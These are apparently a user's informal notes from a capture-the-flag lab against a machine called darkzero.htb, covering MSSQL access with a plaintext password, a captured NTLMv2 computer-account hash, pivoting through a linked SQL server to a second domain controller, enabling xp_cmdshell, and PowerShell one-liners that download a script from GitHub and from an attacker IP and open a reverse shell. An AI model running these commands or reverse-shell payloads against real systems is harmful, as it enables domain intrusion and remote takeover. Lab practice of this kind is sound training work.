___


# User

*this is interesting service account I think*
darkzero\darkzero-ext$ (SidTypeUser)

*sql server service account*
darkzero\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)


*this is probs it for foothold*
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM


*this is also intersting what is this*
2179/tcp  open  vmrdp?        syn-ack ttl 127



john.w doesn't have anything in ad neither does he have intersting access to shares



*have to auth as a local account on the machine*
```
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
```


*present databases*

name     
------   
master   

tempdb   

model    <- do not have access here

msdb <- what is this one



SQL (darkzero\john.w  guest@master)> GRANT IMPERSONATE ON LOGIN::sa to "darkzero\john.w";

INFO(DC01): Line 1: Cannot grant, deny, or revoke permissions to sa, dbo, entity owner, information_schema, sys, or yourself.


*grabbed the computer account hash*
[SMB] NTLMv2-SSP Hash     : DC01$::darkzero:2f0b951dc3ea74f4:F57F881D7496A02C3C73623F02B1652E:010100000000000000AAA1211D42DC01B065B0B3C466B6AC000000000200080057004D004D004F0001001E00570049004E002D0033004C004600550054004C004200450032004400530004003400570049004E002D0033004C004600550054004C00420045003200440053002E0057004D004D004F002E004C004F00430041004C000300140057004D004D004F002E004C004F00430041004C000500140057004D004D004F002E004C004F00430041004C000700080000AAA1211D42DC010600040002000000080030003000000000000000000000000030000090A642B5847F1825DA594AC67BCE1D1C1122FFE62BBC328F9CF7EACA74B5FFBE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310039000000000000000000



*if u map domain trusts in bloodhound you will see that there is another domain*

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   



*user authing to DC02.darkzero.htb*

SQL (darkzero\john.w  guest@master)> EXEC ('SELECT SYSTEM_USER AS CurrentUser') AT "DC02.darkzero.ext"
[%] EXEC ('SELECT SYSTEM_USER AS CurrentUser') AT "DC02.darkzero.ext"
CurrentUser    
------------   
dc01_sql_svc


*worked on DC02*
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell



*got execution as darkzero-ext\svc_sql   *
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
[%] EXEC ('exec master..xp_cmdshell ''whoami''') AT "DC02.darkzero.ext"
output                 
--------------------   
darkzero-ext\svc_sql   

NULL     


*rev shell xp_cmdshell command*
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.19 9001"


```
xp_cmdshell powershell -Command "IEX(IWR http://10.10.14.19:8989/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.19 9001"
```


